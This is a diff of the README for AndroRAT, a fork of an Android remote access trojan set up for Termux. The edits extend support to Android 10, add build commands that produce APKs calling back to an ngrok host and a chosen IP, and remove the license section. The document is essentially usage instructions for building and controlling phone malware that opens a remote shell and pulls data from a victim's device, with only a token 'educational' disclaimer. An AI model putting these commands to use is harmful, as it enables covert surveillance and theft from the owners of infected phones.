@@ -1,5 +1,5 @@
 **Disclaimer** : This software is meant for educational purposes only. I don't feel responsible for any malicious use of the app.
-# AndroRAT forked For Termux all Bugs and errors are fixed by me 
+# AndroRAT forked For Termux all Bugs and errors are fixed by me also added Android 10 support
 
 [![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
 [![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)
@@ -7,7 +7,7 @@
 
 AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.
 
-##### AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)
+##### AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 10 (Q) (API 16 to API 29)
 
 > AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 
 
@@ -33,6 +33,8 @@ AndroRAT requires Python (3.6-3.8) and JAVA 8 (or Android Studio)
 ```
 
 git clone https://github.com/FullPenetrationTesting/AndroRAT
+
+chmod +x install.sh
 
 ./install.sh
 
@@ -124,13 +126,16 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python3 androRAT.py --build --ngrok -o evil.apk```
+```python3 androRAT.py --build --ngrok -o vicky.apk```
 
 * To build the apk using desired ip and port:
-```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o vicky.apk```
 
 * To get the interpreter:
 ```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
+
+* To build the apk using ngrok use this one:
+* ```python3 androRAT.py --build -i 4.tcp.ngrok.io -p 14527 -o vicly.apk
 
 ## Interpreter Examples
 * Generating APK
@@ -154,7 +159,7 @@ In the sh shell there are some sub commands
 * Add screenshot command
 
 
-## License
-AndroRAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
+
+
 
 
